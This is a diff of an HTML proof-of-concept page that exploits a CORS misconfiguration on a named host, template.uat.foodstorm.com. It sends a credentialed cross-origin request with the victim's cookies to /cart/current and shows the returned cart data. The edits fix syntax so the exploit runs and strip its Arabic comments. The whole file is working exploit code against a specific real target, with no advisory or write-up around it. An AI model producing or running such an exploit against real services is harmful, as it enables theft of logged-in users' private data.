@@ -1,27 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Data Leak PoC - template.uat.foodstorm.com</title>
+  <title>CORS Data Leak PoC</title>
 </head>
 <body>
-  <h2>Exploiting CORS Misconfiguration to Read Cart Data</h2>
+  <h2>Exploiting CORS Misconfiguration</h2>
   <p>Status: <span id="status">Attempting to leak data...</span></p>
   <pre id="output" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc;">Waiting for response...</pre>
 
   <script>
-    // الرابط الجديد اللي طلبت تعديله
     const targetUrl = "https://template.uat.foodstorm.com/cart/current";
 
     fetch(targetUrl, {
-      method: "GET", // قراءة البيانات غالباً بتكون GET
-      credentials: "include", // مهم جداً لإرسال الـ Cookies الخاصة بالضحية
-      mode:"cors"
+      method: "GET",
+      mode: "cors", // كان ناقص فاصلة هنا
+      credentials: "include",
       headers: {
         "Accept": "application/json"
       }
     })
     .then(response => {
-      // فحص إذا كان السيرفر يسمح بالدومين بتاعنا (الـ Origin) ويرسل الكوكيز
       const allowOrigin = response.headers.get("Access-Control-Allow-Origin");
       const allowCredentials = response.headers.get("Access-Control-Allow-Credentials");
 
@@ -30,21 +28,15 @@
         "Access-Control-Allow-Origin: " + allowOrigin + "\n" +
         "Access-Control-Allow-Credentials: " + allowCredentials + "\n\n";
 
-      if (response.ok) {
-        return response.json();
-      } else {
-        throw new Error("HTTP error! status: " + response.status);
-      }
+      return response.json();
     })
     .then(data => {
-      document.getElementById("status").innerText = "SUCCESS! Data Leaked.";
-      document.getElementById("output").innerText += 
-        "Victim Cart Data:\n" + JSON.stringify(data, null, 2);
+      document.getElementById("status").innerText = "SUCCESS!";
+      document.getElementById("output").innerText += "Data:\n" + JSON.stringify(data, null, 2);
     })
     .catch(err => {
       document.getElementById("status").innerText = "FAILED";
       document.getElementById("output").innerText += "Error: " + err.message;
-      console.error(err);
     });
   </script>
 </body>
